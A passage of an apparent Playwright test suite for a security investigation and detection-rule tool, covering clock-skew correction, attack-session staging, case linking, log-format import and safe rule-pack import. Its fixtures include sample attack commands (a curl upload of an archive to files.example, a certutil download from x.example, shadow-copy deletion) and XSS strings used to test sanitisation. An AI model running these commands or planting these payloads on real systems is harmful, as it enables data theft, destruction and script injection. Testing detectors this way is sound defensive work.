    dlAfterSave(r); dlAfterSave(r); r.code = code.replace('whoami.exe', 'whoam.exe'); dlAfterSave(r);
    const T = dlTrend(r);
    await ruleHealth(); const H1 = DQ.health, row = id => H1.rows.find(x => x.r.id === id);
    const first = { hist: r.testHist.map(h => h.pass + '/' + h.total), regressed: T.regressed, now: T.now, tfail: row('r-hw').tfail, regressedRow: row('r-hw').regressed,
      untested: !row('r-untested').tests && !row('r-untested').r.builtin };
    // fix it and add a noisy rule, check again: the change is reported
    r.code = code; dlAfterSave(r);
    DB.rules.unshift(mk('r-noise', 'Noise', "title: Noise\nlogsource:\n    product: windows\ndetection:\n    s:\n        _raw|contains: 'e'\n    condition: s\nlevel: low"));
    await ruleHealth(); const H2 = DQ.health, row2 = id => H2.rows.find(x => x.r.id === id);
    first.twin = (row2('r-twin').alike || []).map(a => a.id); first.notTwin = (row2('r-untested').alike || []).map(a => a.id);
    return { first, builtinAlike: H2.rows.filter(x => x.alike && x.r.builtin).length, trendAfterFix: dlTrend(r).now, prevAt: !!H2.prev, noisyBefore: H2.prev.noisy, noisyNow: H2.sum.noisy, tfailBefore: H2.prev.tfail, tfailNow: H2.sum.tfail, hist: DB.prefs.dqHist.length };
  });
  expect(R.first.hist).toEqual(['2/2', '2/2', '1/2']);
  expect(R.first.regressed).toBe(true); expect(R.first.now).toBe(false);
  expect(R.first.tfail).toBe(1); expect(R.first.regressedRow).toBe(true);
  expect(R.first.untested).toBe(true);
  expect(R.first.twin).toContain('r-hw');                    // same logic, different title
  expect(R.first.notTwin).not.toContain('r-hw');             // different program: not a look-alike
  expect(R.trendAfterFix).toBe(true); expect(R.builtinAlike).toBeLessThan(10);   // the built-in pack itself is not flagged wholesale
  expect(R.prevAt).toBe(true); expect(R.noisyNow).toBe(R.noisyBefore + 1); expect(R.tfailBefore).toBeGreaterThan(R.tfailNow);
  // on screen: the change line, the tabs, and the history strip in the rule's Tests tab
  await page.evaluate(() => { UI.dview = 'health'; UI.dqf = 'tests'; renderMain(); });
  await expect(page.locator('.dq-delta')).toContainText('noisy'); await expect(page.locator('.dq-delta')).toContainText('with failing tests');
  await page.click('[data-act=dqf][data-v=alike]'); await expect(page.locator('.dq-r:has(.dq-t b:text-is("Whoami run again"))')).toContainText('Nearly the same logic as');
  await page.click('[data-act=dqf][data-v=untested]'); await expect(page.locator('.dq-r:has-text("My untested rule") .chip')).toContainText(['no tests']);
  await page.evaluate(() => { UI.dview = 'rules'; UI.rule = 'r-hw'; UI.ropen = true; UI.rtab = 'tests'; renderMain(); });
  await expect(page.locator('.dl-hist i')).toHaveCount(4); await expect(page.locator('.dl-hist')).toContainText('Passing since');
  noErrors(errors);
});

test('timeline: a source whose clock is off is found (and normal jitter is not), corrected and undone; sessions show their stages in order', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(() => {
    DB.cases.push({ id: 'c-tx', code: 'TX-1', name: 'Clocks', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    const T = Date.UTC(2024, 4, 2, 9), H = 36e5, M = 6e4; let i = 0;
    const mk = (src, t, title, body, host, tags) => ({ id: 'r-tx' + (i++), caseId: 'c-tx', type: 'evidence', title, body, ts: t, tsRaw: '', tsZone: 'explicit', source: src, host: host || '', tags: tags || [], ents: extractRich(body), addedAt: Date.now() });
    const R = [];
    // EDR sees connections; the firewall logs the same ones one hour later (its clock is in the wrong zone); DNS logs them seconds apart (normal)
    [['203.0.113.10', 0], ['198.51.100.7', 7], ['evil-cdn.example', 13], ['203.0.113.10', 31], ['198.51.100.7', 44]].forEach(([v, m]) => {
      R.push(mk('edr', T + m * M, 'Connection to ' + v, 'connect ' + v, 'WS-01'));
      R.push(mk('firewall', T + m * M + H + (m % 3) * 1000, 'Allowed ' + v, 'allow dst=' + v, 'FW'));
      R.push(mk('dns', T + m * M + 4000, 'Lookup ' + v, 'query ' + v, 'DNS1'));
    });
    // a session on WS-02: logon, discovery, staging, upload — then a quiet afternoon of ordinary events
    R.push(mk('sysmon', T + 2 * H, 'Logon', 'EventID=4624 TargetUserName=eve LogonType=10 logon', 'WS-02'));
    R.push(mk('sysmon', T + 2 * H + 3 * M, 'whoami /all', 'EventID=1 Image=C:\\Windows\\System32\\whoami.exe CommandLine="whoami /all"', 'WS-02', ['discovery']));
    R.push(mk('sysmon', T + 2 * H + 8 * M, '7z archive of shares', 'EventID=1 Image=C:\\Program Files\\7-Zip\\7z.exe CommandLine="7z a c:\\temp\\x.7z \\\\fs01\\finance"', 'WS-02', ['staging']));
    R.push(mk('sysmon', T + 2 * H + 12 * M, 'Upload', 'EventID=3 Image=C:\\Windows\\System32\\curl.exe CommandLine="curl -T c:\\temp\\x.7z https://files.example/up"', 'WS-02', ['exfiltration']));
    for (let k = 0; k < 4; k++) R.push(mk('sysmon', T + 6 * H + k * 20 * M, 'Word opened', 'EventID=1 Image=C:\\Program Files\\Microsoft Office\\WINWORD.EXE', 'WS-02'));
    DB.records.push(...R); rev++; DB.active = 'c-tx';
  });
  const A = await page.evaluate(() => { const D = derive('c-tx'), T = D.recs.filter(r => r.ts).sort((a, b) => a.ts - b.ts); return { skew: tx2Skew(T), sess: tx2Sessions(T).map(s => ({ host: s.host, n: s.n, steps: s.steps })) }; });
  expect(A.skew).toHaveLength(1);
  const sk = A.skew[0]; expect(sk.b).toBe('firewall'); expect(sk.others.sort()).toEqual(['dns', 'edr']); expect(sk.med).toBeGreaterThan(0); expect(Math.abs(Math.abs(sk.med) - 36e5)).toBeLessThan(5000); expect(Math.abs(sk.zone)).toBe(1);
  const ws2 = A.sess.find(s => s.host === 'WS-02'); expect(ws2.n).toBe(4);
  expect(ws2.steps.slice(0, 1)).toEqual(['Logon']); expect(ws2.steps).toEqual(expect.arrayContaining(['Discovery', 'Collection', 'Exfiltration']));
  expect(ws2.steps.indexOf('Discovery')).toBeLessThan(ws2.steps.indexOf('Collection')); expect(ws2.steps.indexOf('Collection')).toBeLessThan(ws2.steps.indexOf('Exfiltration'));
  expect(A.sess.some(s => s.n === 4 && s.steps.length === 0)).toBe(false);          // the ordinary afternoon is not listed
  // on screen, correct the clock, then undo
  await page.evaluate(() => { UI.tlMode = 'patterns'; go(caseHash('c-tx', 'timeline')); });
  await expect(page.locator('.tlx-c:has-text("Clocks that disagree")')).toContainText('time zone');
  await expect(page.locator('.tlx-c:has-text("Sessions")')).toContainText('WS-02');
  const fw0 = await page.evaluate(() => DB.records.find(r => r.source === 'firewall').ts);
  await page.locator('.tlx-c:has-text("Clocks that disagree") [data-act=tx2Shift]').first().click();
  await expect(page.locator('.tlx-c:has-text("Clocks that disagree")')).toHaveCount(0);
  const moved = await page.evaluate(() => { const r = DB.records.find(r => r.caseId === 'c-tx' && r.source === 'firewall') || DB.records.find(r => r.caseId === 'c-tx' && r.source === 'edr'); return r.tsShift; });
  expect(Math.abs(Math.abs(moved) - 36e5)).toBeLessThan(5000);
  await page.click('#toastBtn'); await expect(page.locator('.tlx-c:has-text("Clocks that disagree")')).toHaveCount(1);
  expect(await page.evaluate(() => DB.records.find(r => r.source === 'firewall').ts)).toBe(fw0);
  // show one session: the timeline filters to that host and time
  await page.locator('.tlx-c:has-text("Sessions") [data-act=tx2Sess]').first().click();
  expect(await page.evaluate(() => [UI.tlMode, UI.facet.host])).toEqual(['events', 'WS-02']);
  noErrors(errors);
});

test('blind spots of the same kind are grouped, previewed for noise, and one draft rule closes the whole group', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(() => { UI.tlMode = 'rules'; UI.crf = 'blind'; go(caseHash('c-lantern', 'timeline')); });
  await expect(page.locator('.cr-sum')).toBeVisible({ timeout: 20000 });
  const G = await page.evaluate(() => CR.res.groups.map(g => ({ n: g.G.length, title: g.G[0].r.title, ok: g.ok, extra: g.extra, ids: g.G.map(x => x.r.id) })));
  const beacons = G.find(g => /beacon/i.test(g.title)); expect(beacons).toBeTruthy(); expect(beacons.n).toBeGreaterThanOrEqual(3); expect(beacons.ok).toBe(true);
  expect(G.every(g => g.n >= 2)).toBe(true);
  const card = page.locator('.cr-g', { hasText: beacons.title }).first();
  await expect(card).toContainText(beacons.n + ' alike');
  await expect(card).toContainText(beacons.extra ? 'would also match' : 'would match nothing else');
  const blind0 = await page.evaluate(() => CR.res.blind.length);
  await card.locator('[data-act=crDraftG]').click();
  await expect(page).toHaveURL(/#\/detections/);
  const rule = await page.evaluate(() => { const r = DB.rules[0]; return { tests: r.tests.filter(t => t.kind === 'hit').length, draft: r.tags.includes('draft') }; });
  expect(rule.draft).toBe(true); expect(rule.tests).toBe(Math.min(5, beacons.n));
  await page.evaluate(() => { UI.tlMode = 'rules'; go(caseHash('c-lantern', 'timeline')); });
  await expect.poll(() => page.evaluate(() => CR.res && CR.sig === crSig('c-lantern') && CR.res.blind.length)).toBe(blind0 - beacons.n);
  noErrors(errors);
});

test('a corrected clock shows on every event it touched, can be taken back from any of them, and survives export and import', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(() => {
    DB.cases.push({ id: 'c-ts', code: 'TS-1', name: 'Clock', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    const T = Date.UTC(2024, 4, 2, 9); let i = 0; const mk = (src, t, b) => ({ id: 'r-ts' + (i++), caseId: 'c-ts', type: 'evidence', title: src + ' ' + i, body: b, ts: t, tsRaw: '', tsZone: 'explicit', source: src, host: 'H', tags: [], ents: extractRich(b), addedAt: Date.now() });
    for (const [m, v] of [[0, '203.0.113.10'], [5, '198.51.100.7'], [9, '203.0.113.10'], [14, '198.51.100.7']]) DB.records.push(mk('edr', T + m * 6e4, 'connect ' + v), mk('fw', T + m * 6e4 + 36e5, 'allow tcp 10.0.0.5:5000 -> ' + v + ':443'));
    rev++; DB.active = 'c-ts'; UI.tlMode = 'patterns'; go(caseHash('c-ts', 'timeline'));
  });
  await page.locator('.tlx-c:has-text("Clocks that disagree") [data-act=tx2Shift]').first().click();
  const shifted = await page.evaluate(() => DB.records.filter(r => r.caseId === 'c-ts' && r.tsShift).map(r => r.source));
  expect(shifted.length).toBe(4); expect(new Set(shifted).size).toBe(1);
  // the timeline marks each corrected event; the details panel explains and offers to take it back
  await page.evaluate(() => { UI.tlMode = 'events'; renderMain(); });
  await expect(page.locator('.tshift')).toHaveCount(4);
  const id = await page.evaluate(() => DB.records.find(r => r.caseId === 'c-ts' && r.tsShift).id);
  await page.evaluate(i => { UI.sel = { kind: 'rec', id: i }; UI.inspOpen = true; renderAll(); }, id);
  await expect(page.locator('.tshift-n')).toContainText('Time corrected by');
  await expect(page.locator('.tshift-n')).toContainText('recorded as');
  // export the case and import it back: the correction travels with it; junk values are dropped
  const back = await page.evaluate(() => { const r = normRecord({ title: 'x', body: '', ts: 5, tsShift: 'evil' }), r2 = normRecord({ title: 'x', body: '', ts: 5, tsShift: 9e12 }), r3 = normRecord({ title: 'x', body: '', ts: 5, tsShift: 36e5 }); return [r.tsShift, r2.tsShift, r3.tsShift]; });
  expect(back).toEqual([undefined, undefined, 36e5]);
  await page.locator('.tshift-n [data-act=tx2Unshift]').click();
  expect(await page.evaluate(() => DB.records.filter(r => r.caseId === 'c-ts' && r.tsShift).length)).toBe(0);
  await page.click('#toastBtn');
  expect(await page.evaluate(() => DB.records.filter(r => r.caseId === 'c-ts' && r.tsShift).length)).toBe(4);
  noErrors(errors);
});

test('the same run of stages on a second host, later, is pointed out; hosts that only log on are not', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    DB.cases.push({ id: 'c-rp', code: 'RP-1', name: 'Repeat', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    const T = Date.UTC(2024, 4, 2, 9), M = 6e4, H = 36e5; let i = 0;
    const mk = (host, t, title, body, tags) => ({ id: 'r-rp' + (i++), caseId: 'c-rp', type: 'evidence', title, body, ts: t, tsRaw: '', tsZone: 'explicit', source: 'sysmon', host, tags: tags || [], ents: extractRich(body), addedAt: Date.now() });
    const run = (host, t0) => [mk(host, t0, 'Logon', 'EventID=4624 TargetUserName=eve LogonType=10 logon'), mk(host, t0 + 3 * M, 'whoami', 'EventID=1 Image=C:\\Windows\\System32\\whoami.exe', ['discovery']),
      mk(host, t0 + 8 * M, '7z', 'EventID=1 Image=C:\\Program Files\\7-Zip\\7z.exe', ['staging']), mk(host, t0 + 12 * M, 'upload', 'EventID=3 Image=curl.exe', ['exfiltration'])];
    DB.records.push(...run('WS-01', T), ...run('WS-02', T + 3 * H),
      mk('WS-03', T + H, 'Logon', 'EventID=4624 TargetUserName=bob LogonType=2 logon'), mk('WS-03', T + H + M, 'Logon', 'EventID=4624 TargetUserName=bob LogonType=2 logon'), mk('WS-03', T + H + 2 * M, 'Logon', 'EventID=4624 TargetUserName=bob LogonType=2 logon'),
      mk('WS-04', T + 5 * H, 'beacon', 'x', ['c2']), mk('WS-04', T + 5 * H + M, 'beacon', 'x', ['c2']), mk('WS-04', T + 5 * H + 2 * M, 'beacon', 'x', ['c2']));
    rev++; const D = derive('c-rp'), Ts = D.recs.filter(r => r.ts).sort((a, b) => a.ts - b.ts);
    return tx2Repeats(tx2Sessions(Ts)).map(x => ({ a: x.A.host, b: x.B.host, steps: x.steps, after: x.after }));
  });
  expect(R).toHaveLength(1);
  expect(R[0]).toMatchObject({ a: 'WS-01', b: 'WS-02', after: 3 * 36e5 });
  expect(R[0].steps).toEqual(['Logon', 'Discovery', 'Collection', 'Exfiltration']);
  await page.evaluate(() => { DB.active = 'c-rp'; UI.tlMode = 'patterns'; go(caseHash('c-rp', 'timeline')); });
  await expect(page.locator('.tx2-rep')).toContainText('WS-02 went through Logon → Discovery → Collection → Exfiltration 3h 0m after WS-01 did');
  await page.locator('.tx2-rep [data-act=tlxWin]').click();
  expect(await page.evaluate(() => [UI.tlMode, UI.facet.win.label])).toEqual(['events', 'WS-01 → WS-02']);
  noErrors(errors);
});

test('connected cases: shared malicious indicators and vault entries are a strong link; same /24 is weaker; private, benign and everywhere-things are not links', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    const mkC = (id, code) => DB.cases.push({ id, code, name: code + ' — test', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    ['A', 'B', 'C', 'D'].forEach(x => mkC('c-' + x, 'LK-' + x));
    let i = 0; const rec = (c, body) => DB.records.push({ id: 'r-lk' + (i++), caseId: c, type: 'evidence', title: body.slice(0, 30), body, ts: Date.now(), tsRaw: '', source: 's', host: '', tags: [], ents: extractRich(body), addedAt: Date.now() });
    rec('c-A', 'beacon to 203.0.113.47 and lookup of evil-lamp.com, also 10.0.0.5 and mail via gmail.com, safe cdn.okfine.net');
    rec('c-B', 'seen 203.0.113.47 again, and 10.0.0.5, gmail.com, cdn.okfine.net');
    rec('c-C', 'scan from 203.0.113.99 and login.evil-lamp.com, gmail.com');
    rec('c-D', 'nothing shared except gmail.com');
    DB.verdicts = DB.verdicts || {}; DB.verdicts[entKey({ k: 'ipv4', v: '203.0.113.47' })] = 'malicious'; DB.verdicts[entKey({ k: 'domain', v: 'cdn.okfine.net' })] = 'benign';
    const en = (c, v) => DB.entries.push({ id: uid('e'), caseId: c, type: 'phone', fields: { number: v }, tags: [], notes: '', priority: 'medium', created: Date.now() });
    en('c-A', '+44 7700 900123'); en('c-B', '07700-900-123');
    rev++;
    const L = caseLinks('c-A').map(x => ({ code: x.c.code, strength: x.strength, shared: x.shared.map(s => s.kind + ':' + s.v), near: x.near.map(n => n.why) }));
    return { L, sample: caseLinks('c-A').some(x => x.c.sample) };
  });
  const B = R.L.find(x => x.code === 'LK-B'), C = R.L.find(x => x.code === 'LK-C');
  expect(R.L[0].code).toBe('LK-B'); expect(B.strength).toBe('strong');
  expect(B.shared).toEqual(expect.arrayContaining(['ind:203.0.113.47', 'vault:+44 7700 900123']));
  expect(B.shared.join()).not.toMatch(/10\.0\.0\.5|okfine|gmail/);          // private, benign, everywhere
  expect(C.strength).toBe('weak'); expect(C.near).toEqual(expect.arrayContaining(['same /24 network', 'same registered domain evil-lamp.com']));
  expect(R.L.some(x => x.code === 'LK-D')).toBe(false); expect(R.sample).toBe(false);
  await page.evaluate(() => go(caseHash('c-A', 'overview')));
  await expect(page.locator('.lk')).toContainText('LK-B'); await expect(page.locator('.lk .lk-c').first()).toContainText('Strong link');
  await page.locator('.lk [data-act=lkEnt]').first().click();
  expect(await page.evaluate(() => UI.sel && UI.sel.kind)).toBe('ent');
  noErrors(errors);
});

test('rule history: saves keep what they replace, two versions compare line by line, an old one goes back in the editor and is kept again on save', async ({ page }) => {
  const errors = await open(page, '#/detections');
  await page.locator('.page [data-act=rNew]').first().click(); await page.click('.ctx-it:has-text("Sigma")');
  await page.click('[data-rtab=history]'); await expect(page.locator('#dlPane')).toContainText('There are none yet');
  const v1 = await page.inputValue('#rCode');
  // save 1: a code change; save 2: a title change; save 3: nothing changed
  await page.click('[data-rtab=rule]'); await page.fill('#rCode', v1.replace(/condition: .*/, 'condition: selection\n# first edit')); await page.keyboard.press('Control+s');
  await page.fill('#rTitle', 'Renamed rule'); await page.keyboard.press('Control+s');
  await page.keyboard.press('Control+s');
  const n = await page.evaluate(() => rvList(DB.rules.find(r => r.id === UI.rule)).length); expect(n).toBe(2);
  await page.click('[data-rtab=history]');
  await expect(page.locator('.rv-t tbody tr')).toHaveCount(3);
  await expect(page.locator('form.rx')).not.toHaveClass(/dirty/);
  // compare the original with the editor: one added line and the title change
  await page.locator('.rv-t [data-act=rvPick][data-v="a:2"]').check();
  await expect(page.locator('.rv-sum')).toContainText('+1');
  await expect(page.locator('.rv-d .rv-l.add')).toContainText('# first edit');
  await expect(page.locator('.rv-m')).toContainText('Renamed rule');
  await expect(page.locator('form.rx')).not.toHaveClass(/dirty/);                  // picking versions is not an edit
  // put the original back: the editor holds it, unsaved; saving keeps the replaced version
  await page.locator('.rv-t tbody tr').nth(2).locator('[data-act=rvUse]').click();
  expect(await page.inputValue('#rCode')).toBe(v1); await expect(page.locator('form.rx')).toHaveClass(/dirty/);
  await page.keyboard.press('Control+s');                                              // focus is back in the editor, so the shortcut saves
  const after = await page.evaluate(() => { const r = DB.rules.find(r => r.id === UI.rule); return { code: r.code, n: rvList(r).length, last: rvList(r).slice(-1)[0].title }; });
  expect(after.code).toBe(v1); expect(after.n).toBe(3); expect(after.last).toBe('Renamed rule');
  // a bad history from an import is ignored, not trusted
  expect(await page.evaluate(() => rvList({ versions: [null, { code: 5, at: 1 }, { code: 'x', at: 0 }, { code: 'ok', at: 9 }] }).length)).toBe(1);
  noErrors(errors);
});

test('cloud, identity and network log files import as real events: CloudTrail, Okta, Microsoft 365 (CSV with AuditData), Zeek TSV and JSON, Windows XML exports', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    const imp = (text, name) => { const P = logParse(text, name), cols = [...new Set(P.rows.slice(0, 200).flatMap(r => Object.keys(r)))], M = { time: logGuess(cols, 'time'), title: logGuess(cols, 'title'), host: logGuess(cols, 'host'), source: logGuess(cols, 'source') };
      const recs = P.rows.map(r => logRec(r, M, name)); return { fmt: P.fmt, cols: cols.filter(c => c.startsWith('__')).length, recs: recs.map(r => { const p = parseLog(r.body.length <= 20000 ? r.body : ''); return { title: r.title, ts: r.ts, format: p && p.format, user: p && p.norm.user, ip: p && p.norm['src.ip'], action: p && p.norm.action, status: p && p.norm.status }; }) }; };
    const ct = JSON.stringify({ Records: [
      { eventVersion: '1.08', userIdentity: { type: 'IAMUser', userName: 'ops-admin', arn: 'arn:aws:iam::111122223333:user/ops-admin' }, eventTime: '2024-03-01T10:00:00Z', eventSource: 'signin.amazonaws.com', eventName: 'ConsoleLogin', awsRegion: 'us-east-1', sourceIPAddress: '198.51.100.7', userAgent: 'Mozilla/5.0', errorMessage: 'Failed authentication', errorCode: 'Failed authentication', eventType: 'AwsConsoleSignIn' },
      { eventVersion: '1.08', userIdentity: { type: 'AssumedRole', principalId: 'AROA:dev', sessionContext: { sessionIssuer: { userName: 'deploy-role' } } }, eventTime: '2024-03-01T10:05:00Z', eventSource: 's3.amazonaws.com', eventName: 'PutBucketPolicy', sourceIPAddress: '203.0.113.9', requestParameters: { bucketName: 'prod-backups' } }] }, null, 2);
    const okta = JSON.stringify([{ uuid: 'a1', published: '2024-03-01T11:00:00.000Z', eventType: 'user.session.start', displayMessage: 'User login to Okta', actor: { id: '00u1', alternateId: 'eve@corp.example', type: 'User' }, client: { ipAddress: '45.33.32.156', userAgent: { rawUserAgent: 'curl/8.0' }, geographicalContext: { country: 'Netherlands' } }, outcome: { result: 'FAILURE', reason: 'INVALID_CREDENTIALS' } }]);
    const audit = { CreationTime: '2024-03-01T12:00:00', Operation: 'New-InboxRule', UserId: 'cfo@corp.example', Workload: 'Exchange', ClientIP: '[2001:db8::7]:51234', ResultStatus: 'True', Parameters: [{ Name: 'ForwardTo', Value: 'x@evil.example' }] };
    const m365 = 'CreationDate,UserIds,Operations,AuditData\r\n2024-03-01T12:00:00.0000000Z,cfo@corp.example,New-InboxRule,"' + JSON.stringify(audit).replace(/"/g, '""') + '"\r\n';
    const zeek = '#separator \\x09\n#set_separator\t,\n#empty_field\t(empty)\n#unset_field\t-\n#path\tconn\n#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\tservice\tduration\n#types\ttime\tstring\taddr\tport\taddr\tport\tenum\tstring\tinterval\n1709287200.123456\tCx1\t10.0.0.5\t51022\t203.0.113.47\t4444\ttcp\t-\t12.5\n1709287260.5\tCx2\t10.0.0.5\t51031\t203.0.113.47\t4444\ttcp\t-\t-\n#close\t2024-03-01-11-00-00';
    const zjson = '{"ts":1709287200.1,"uid":"Cd1","id.orig_h":"10.0.0.5","id.orig_p":5353,"id.resp_h":"8.8.8.8","id.resp_p":53,"proto":"udp","query":"update-lamp.test","qtype_name":"A"}\n{"ts":1709287201.2,"uid":"Cd2","id.orig_h":"10.0.0.5","id.orig_p":5354,"id.resp_h":"8.8.8.8","id.resp_p":53,"proto":"udp","query":"evil.example"}';
    const xml = '<?xml version="1.0" encoding="UTF-8"?>\n<Events>\n<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4625</EventID><TimeCreated SystemTime="2024-03-01T13:00:00.000Z"/><Computer>DC01</Computer></System><EventData><Data Name="TargetUserName">admin</Data><Data Name="IpAddress">198.51.100.7</Data><Data Name="LogonType">3</Data></EventData></Event>\n<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>4624</EventID><TimeCreated SystemTime="2024-03-01T13:01:00.000Z"/><Computer>DC01</Computer></System><EventData><Data Name="TargetUserName">admin</Data></EventData></Event>\n</Events>';
    return { ct: imp(ct, 'ct.json'), okta: imp(okta, 'okta.json'), m365: imp(m365, 'audit.csv'), zeek: imp(zeek, 'conn.log'), zjson: imp(zjson, 'dns.log'), xml: imp(xml, 'sec.xml') };
  });
  const t = s => Date.parse(s);
  // CloudTrail: who, what, from where, and that it failed
  expect(R.ct.recs).toHaveLength(2); expect(R.ct.cols).toBe(0);
  expect(R.ct.recs[0]).toMatchObject({ format: 'AWS CloudTrail · ConsoleLogin', user: 'ops-admin', ip: '198.51.100.7', action: 'ConsoleLogin', ts: t('2024-03-01T10:00:00Z') });
  expect(R.ct.recs[0].status).toMatch(/failure/); expect(R.ct.recs[0].title).toMatch(/ConsoleLogin.*ops-admin.*from 198\.51\.100\.7/);
  expect(R.ct.recs[1]).toMatchObject({ user: 'deploy-role', action: 'PutBucketPolicy' });
  // Okta
  expect(R.okta.recs[0]).toMatchObject({ format: 'Okta · User login to Okta', user: 'eve@corp.example', ip: '45.33.32.156', status: 'FAILURE', ts: t('2024-03-01T11:00:00Z') });
  // Microsoft 365 CSV export: the event inside AuditData is unpacked; the bracketed IPv6:port is cleaned
  expect(R.m365.fmt).toMatch(/AuditData/); expect(R.m365.recs).toHaveLength(1);
  expect(R.m365.recs[0].title).toMatch(/New-InboxRule/);
  expect(R.m365.recs[0].ts).toBe(t('2024-03-01T12:00:00Z'));
  // Zeek TSV: columns from #fields, "-" empty, epoch seconds read, comment lines skipped
  expect(R.zeek.fmt).toBe('Zeek conn'); expect(R.zeek.recs).toHaveLength(2);
  expect(R.zeek.recs[0].ts).toBe(1709287200123); expect(R.zeek.recs[0].title).toMatch(/10\.0\.0\.5:51022 → 203\.0\.113\.47:4444/);
  // Zeek JSON
  expect(R.zjson.recs[0].format).toBe('Zeek · dns'); expect(R.zjson.recs[0].ts).toBe(1709287200100);
  // Windows XML export: two events, each with its own time and a readable title
  expect(R.xml.fmt).toBe('Windows event XML'); expect(R.xml.recs).toHaveLength(2);
  expect(R.xml.recs[0].ts).toBe(t('2024-03-01T13:00:00Z')); expect(R.xml.recs[1].ts).toBe(t('2024-03-01T13:01:00Z'));
  expect(R.xml.recs[0].title).toMatch(/4625/);
  noErrors(errors);
});

test('rule packs: a downloaded zip comes back with tests and history; identical rules are skipped, clashes are your choice, and one Undo takes it all back', async ({ page }) => {
  const errors = await open(page, '#/detections');
  await page.evaluate(() => {
    const code = t => "title: " + t + "\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    s:\n        Image|endswith: '\\\\" + t.toLowerCase().replace(/\W+/g, '') + ".exe'\n    condition: s\nlevel: high";
    const mk = (id, t) => ({ id, type: 'sigma', title: t, desc: 'mine', code: code(t), severity: 'high', category: 'process', technique: '', author: 'You', platform: 'Windows', tags: [], created: Date.now(), updated: Date.now(),
      tests: [{ id: uid('t'), kind: 'hit', text: 'Image="C:\\\\x\\\\' + t.toLowerCase().replace(/\W+/g, '') + '.exe"' }] });
    const A = mk('r-pa', 'Pack Alpha'), B = mk('r-pb', 'Pack Bravo'); DB.rules.unshift(A, B);
    rvKeep(A, { ...A, code: A.code + '\n# v2' }); A.code += '\n# v2'; dlAfterSave(A);
    UI.dview = 'rules'; DB.prefs.rlay = 'table'; UI.dq = 'Pack '; UI.rpick = new Set(['r-pa', 'r-pb', DB.rules.find(r => r.builtin).id]); renderMain();
  });
  const dl = page.waitForEvent('download'); await page.click('[data-act=rbDl]'); const zip = await (await dl).path();
  // later: Alpha is gone, Bravo was rewritten here
  await page.evaluate(() => { DB.rules = DB.rules.filter(r => r.id !== 'r-pa'); const b = DB.rules.find(r => r.id === 'r-pb'); b.code = b.code.replace('high', 'low') + '\n# changed here'; UI.rpick = new Set(); mutate('t'); renderMain(); });
  const n0 = await page.evaluate(() => DB.rules.length);
  const fc = page.waitForEvent('filechooser'); await page.evaluate(() => importRules()); await (await fc).setFiles({ name: 'osintrix-rules-3.zip', mimeType: 'application/zip', buffer: require('fs').readFileSync(zip) });
  await expect(page.locator('#dlg .rp')).toBeVisible();
  await expect(page.locator('#dlg .tlx-kpi')).toContainText('1new');
  await expect(page.locator('#dlg .tlx-kpi')).toContainText('1already here');
  await expect(page.locator('#dlg .tlx-kpi')).toContainText('1same title, different logic');
  await page.selectOption('#dlg [data-rp="0"]', 'replace');
  await page.click('[data-act=rpGo]');
  const R = await page.evaluate(() => { const a = DB.rules.find(r => r.title === 'Pack Alpha'), b = DB.rules.find(r => r.id === 'r-pb');
    return { n: DB.rules.length, a: a && { tests: a.tests.length, versions: rvList(a).length, hist: dlHist(a).length, v2: a.code.includes('# v2') }, bCode: b.code.includes('# changed here'), bKept: rvList(b).some(v => v.code.includes('# changed here')), bravos: DB.rules.filter(r => /^Pack Bravo/.test(r.title)).length }; });
  expect(R.n).toBe(n0 + 1);
  expect(R.a).toEqual({ tests: 1, versions: 1, hist: 1, v2: true });
  expect(R.bCode).toBe(false); expect(R.bKept).toBe(true); expect(R.bravos).toBe(1);
  await page.click('#toastBtn');
  expect(await page.evaluate(() => [DB.rules.length, DB.rules.find(r => r.id === 'r-pb').code.includes('# changed here')])).toEqual([n0, true]);
  // a hostile or broken pack: nothing unsafe gets in
  const fc2 = page.waitForEvent('filechooser'); await page.evaluate(() => importRules());
  await (await fc2).setFiles({ name: 'bad.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify([{ type: 'sigma', title: '<img src=x onerror=alert(1)>', code: 'detection:\n  s:\n    a: b\n  condition: s', refs: ['javascript:alert(1)', 'https://ok.example'], severity: 'apocalyptic', versions: [{ code: 5 }], testHist: [{ at: 1, pass: 9, total: 2 }] }, { type: 'evil', code: 'x' }, 'junk', null])) });
  await expect(page.locator('#dlg img')).toHaveCount(0); await page.click('[data-act=rpGo]');
  const bad = await page.evaluate(() => { const r = DB.rules[0]; return { title: r.title, refs: r.refs, sev: r.severity, v: rvList(r).length, h: dlHist(r).length }; });
  expect(bad).toEqual({ title: '<img src=x onerror=alert(1)>', refs: ['https://ok.example'], sev: 'medium', v: 0, h: 0 });
  noErrors(errors);
});

test('the fast rule pre-check finds exactly what evaluating every rule on every event finds', async ({ page }) => {
  const errors = await open(page, '#/detections');
  const R = await page.evaluate(() => {
    // the demo evidence, every built-in sample, and tricky variants: JSON-escaped paths, case changes, filters, wildcards, keywords
    const extra = ['{"Image":"C:\\\\Windows\\\\System32\\\\cmd.exe","CommandLine":"cmd.exe /c whoami /all","ParentImage":"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE"}',
      'EventID=1 Image="C:\\WINDOWS\\SYSTEM32\\CERTUTIL.EXE" CommandLine="certutil -urlcache -split -f http://x.example/a.exe a.exe"',
      'EventID=4688 New Process Name: C:\\Windows\\System32\\vssadmin.exe Process Command Line: vssadmin delete shadows /all /quiet',
      'EventID=1 Image=C:\\Windows\\System32\\rundll32.exe CommandLine="rundll32.exe C:\\Users\\a\\AppData\\Local\\Temp\\x.dll,Start"',
